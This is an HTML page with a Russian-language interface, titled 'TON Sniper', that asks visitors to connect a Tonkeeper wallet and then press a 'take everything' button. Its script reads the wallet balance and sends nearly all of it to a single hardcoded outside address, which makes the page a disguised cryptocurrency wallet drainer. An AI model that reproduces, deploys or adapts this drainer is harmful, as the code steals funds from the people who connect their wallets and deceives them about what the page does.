<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TON Sniper</title>
    <style>
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            width: 450px;
        }
        button {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            padding: 15px 40px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }
        button:hover {
            transform: scale(1.02);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        #status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            min-height: 70px;
            border: 1px solid #2a2a2a;
            word-break: break-all;
            font-size: 14px;
        }
        .wallet {
            background: #111;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
            border: 1px solid #2a2a2a;
        }
        .hidden {
            display: none;
        }
        .install-link {
            color: #00d4ff;
            text-decoration: underline;
            cursor: pointer;
        }
        .error-box {
            background: #2a0a0a;
            border: 1px solid #ff3333;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ TON SNIPER</h2>
        
        <div class="wallet">
            👤 <span id="walletAddress">Не подключён</span>
        </div>
        
        <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
        <button id="snipeBtn" class="hidden">💰 ЗАБРАТЬ ВСЁ</button>
        
        <div id="status">⏳ Проверка TON Keeper...</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        let provider = null;
        let userAddress = null;

        const connectBtn = document.getElementById('connectBtn');
        const snipeBtn = document.getElementById('snipeBtn');
        const status = document.getElementById('status');
        const walletDisplay = document.getElementById('walletAddress');

        // ========== ПРОВЕРКА УСТАНОВКИ TON KEEPER ==========
        function checkTonKeeper() {
            // Проверяем все возможные объекты
            if (window.tonkeeper) {
                status.innerHTML = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
                return true;
            }
            
            if (window.ton) {
                status.innerHTML = '🟢 TON найден! Нажмите кнопку.';
                return true;
            }
            
            if (window.Tonkeeper) {
                status.innerHTML = '🟢 Tonkeeper найден! Нажмите кнопку.';
                return true;
            }
            
            // Если не найден - показываем инструкцию
            status.innerHTML = `
                ❌ TON Keeper НЕ УСТАНОВЛЕН!<br><br>
                <div class="error-box">
                    <b>Как установить:</b><br><br>
                    1. Откройте <b>Google Chrome</b> (это важно!)<br>
                    2. Перейдите в <b>Chrome Web Store</b><br>
                    3. Найдите <b>"TON Keeper"</b><br>
                    4. Нажмите <b>"Установить"</b><br><br>
                    <a href="https://chrome.google.com/webstore/detail/ton-keeper/nphplpgoakhhjchkkhmiggakijnkhfnd" 
                       target="_blank" 
                       style="color:#00d4ff;font-size:16px;font-weight:bold;">
                       🔗 УСТАНОВИТЬ TON KEEPER
                    </a>
                    <br><br>
                    <span style="color:#888;font-size:12px;">
                        После установки ОБНОВИТЕ СТРАНИЦУ (F5)
                    </span>
                </div>
            `;
            return false;
        }

        // ========== ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ==========
        connectBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Подключение...';
                connectBtn.disabled = true;
                
                // Проверяем ещё раз
                if (!window.tonkeeper && !window.ton && !window.Tonkeeper) {
                    status.innerHTML = '❌ TON Keeper не найден. Установите расширение!';
                    connectBtn.disabled = false;
                    checkTonKeeper();
                    return;
                }
                
                // Берём провайдера
                provider = window.tonkeeper || window.ton || window.Tonkeeper;
                
                // Запрашиваем доступ
                const accounts = await provider.send('ton_requestAccounts', {});
                
                if (!accounts || accounts.length === 0) {
                    status.innerText = '❌ Пользователь отклонил подключение';
                    connectBtn.disabled = false;
                    return;
                }
                
                userAddress = accounts[0];
                walletDisplay.innerText = userAddress;
                status.innerText = `✅ Кошелёк привязан: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                
                // Показываем кнопку "Забрать всё"
                snipeBtn.classList.remove('hidden');
                connectBtn.innerText = '✅ ПОДКЛЮЧЕН';
                connectBtn.disabled = true;
                
                // Показываем баланс
                await getBalance();
                
            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                connectBtn.disabled = false;
            }
        };

        // ========== ПОЛУЧИТЬ БАЛАНС ==========
        async function getBalance() {
            try {
                const hex = await provider.send('ton_getBalance', { address: userAddress });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(4);
                status.innerText = `💰 Баланс: ${balance} TON`;
                return nano;
            } catch(e) {
                status.innerText = '❌ Ошибка баланса: ' + e.message;
                return 0;
            }
        }

        // ========== ЗАБРАТЬ ВСЁ ==========
        snipeBtn.onclick = async function() {
            try {
                status.innerText = '⏳ Проверка баланса...';
                snipeBtn.disabled = true;
                
                const nano = await getBalance();
                
                if (nano <= 0) {
                    status.innerText = '❌ Баланс 0 TON. Нечего выводить.';
                    snipeBtn.disabled = false;
                    return;
                }
                
                const fee = 10000000; // 0.01 TON
                const amount = nano - fee;
                
                if (amount <= 0) {
                    status.innerText = `❌ Баланс ${(nano/1e9).toFixed(4)} TON — меньше комиссии 0.01 TON`;
                    snipeBtn.disabled = false;
                    return;
                }
                
                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON на целевой адрес...`;
                
                const result = await provider.send('ton_sendTransaction', {
                    to: TARGET,
                    value: String(amount),
                    data: '',
                    stateInit: ''
                });
                
                if (result && result.code === 0) {
                    status.innerText = `✅ УСПЕШНО! ${(amount/1e9).toFixed(4)} TON переведено!`;
                    snipeBtn.innerText = '✅ ВЫВЕДЕНО';
                    snipeBtn.disabled = true;
                } else {
                    status.innerText = '❌ Транзакция отклонена пользователем';
                    snipeBtn.disabled = false;
                }
                
            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                snipeBtn.disabled = false;
            }
        };

        // ========== ЗАПУСК ПРИ ЗАГРУЗКЕ ==========
        checkTonKeeper();
    </script>
</body>
</html>
